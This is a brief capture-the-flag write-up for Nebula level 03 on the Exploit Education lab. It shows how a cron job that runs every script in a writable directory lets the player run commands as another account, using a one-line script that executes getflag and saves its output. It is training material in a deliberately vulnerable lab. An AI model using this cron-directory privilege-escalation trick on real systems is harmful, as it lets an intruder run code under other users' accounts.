### [Exploit Education Level 3](https://exploit.education/nebula/level-03/)

## Challenge 
    
Check the home directory of `flag03` and take note of the files there.
There is a `crontab` that is called every couple of minutes.
Crontab is a service that run periodically. In this example the crontab executes the contents of any file inside
crontab.d directory

## Vulnerability
We can run any commands by writing the commands to a file in the crontab directory and writing the output to a file
``` bash
level03@nebula:echo 'getflag >>/tmp/flag.txt' > run.sh
level03@nebula:/tmp$ ls
flag.txt  VMwareDnD  vmware-root
level03@nebula:/tmp$ cat flag.txt
You have successfully executed getflag on a target account
```
